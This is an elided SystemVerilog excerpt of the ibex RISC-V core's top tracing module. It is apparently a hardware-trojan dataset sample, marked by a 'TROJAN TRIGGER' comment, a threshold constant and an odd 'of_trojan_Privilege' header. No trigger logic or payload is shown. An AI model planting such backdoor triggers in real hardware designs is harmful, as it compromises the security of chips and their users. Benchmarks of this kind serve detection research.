...
/**
 * Top level module of_trojan_Privilege the ibex RISC-V core with tracing enabled
 */
...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  `ifndef RVFI
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=8305)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 8305;
